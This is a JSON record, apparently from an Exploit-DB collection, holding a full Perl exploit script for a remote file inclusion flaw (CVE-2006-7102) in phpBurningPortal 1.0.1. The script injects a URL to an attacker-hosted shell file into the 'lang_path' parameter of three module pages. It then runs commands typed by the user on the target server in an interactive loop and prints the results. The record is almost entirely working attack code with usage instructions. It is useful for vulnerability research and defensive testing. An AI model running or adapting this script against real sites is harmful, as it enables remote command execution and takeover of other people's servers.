{
  "id": "2563",
  "title": "phpBurningPortal 1.0.1 - &#039;lang_path&#039; Remote File Inclusion",
  "cve": "CVE-2006-7102",
  "vuln_type": "unknown",
  "code": "#!/usr/bin/perl\r\n\r\nuse LWP::UserAgent;\r\nuse LWP::Simple;\r\n\r\n$target = @ARGV[0];\r\n$shellsite = @ARGV[1];\r\n$shellcmd = @ARGV[2];\r\n$fileno = @ARGV[3];\r\n\r\nif(!$target || !$shellsite)\r\n{\r\n    usage();\r\n}\r\n\r\nheader();\r\n\r\nif ($fileno eq 1)\r\n{\r\n    $file = \"quest_delete.php?lang_path=\";\r\n}\r\nelsif ($fileno eq 2)\r\n{\r\n    $file = \"quest_edit.php?lang_path=\";\r\n}\r\nelsif ($fileno eq 3)\r\n{\r\n    $file = \"quest_news.php?lang_path=\";\r\n}\r\nelse\r\n{\r\n    $file = \"quest_delete.php?lang_path=\";\r\n}\r\n\r\nprint \"[cmd]\\$\";\r\n$cmd = <STDIN>;\r\n\r\nwhile ($cmd !~ \"exit\")\r\n{\r\n    $xpl = LWP::UserAgent->new() or die;\r\n        $req =\r\nHTTP::Request->new(GET=>$target'/modules/includes/'.$file.$shellsite.'?&'.$shellcmd.'='.$cmd)\r\nor die(\"\\n\\n Failed to connect.\");\r\n        $res = $xpl->request($req);\r\n        $r = $res->content;\r\n        $r =~ tr/[\\n]/[&#234;]/;\r\n\r\n    if (@ARGV[4] eq \"-r\")\r\n    {\r\n        print $r;\r\n    }\r\n\r\n    print \"[cmd]\\$\";\r\n    $cmd = <STDIN>;\r\n}\r\n\r\nsub header()\r\n{\r\n    print q\r\n    {\r\n########################################################################\r\n    phpBurningPortal quiz-modul-1.0.1 - Remote File Include Exploit\r\n               Vulnerability discovered and exploit by r0ut3r\r\n                       writ3r@gmail.com\r\n            For portal administrator testing purposes only!\r\n########################################################################\r\n    };\r\n}\r\n\r\nsub usage()\r\n{\r\nheader();\r\n    print q\r\n    {\r\n########################################################################\r\nUsage:\r\nperl q_xpl.pl <Target website> <Shell Location> <CMD Variable> <No> <r>\r\n<Target Website> - Path to target eg: www.qvuln.target.com\r\n<Shell Location> - Path to shell eg: www.badserver.com/s.txt\r\n<CMD Variable> - Shell command variable name eg: cmd\r\n<No> - File number, corresponding to:\r\n1: quest_delete.php\r\n2: quest_edit.php\r\n3: quest_news.php\r\n<r> - Show output from shell\r\nExample:\r\nperl a.pl http://localhost http://localhost/s.txt cmd 1 -r\r\n########################################################################\r\n    };\r\nexit();\r\n}\r\n\r\n# milw0rm.com [2006-10-15]",
  "url": "https://www.exploit-db.com/exploits/2563"
}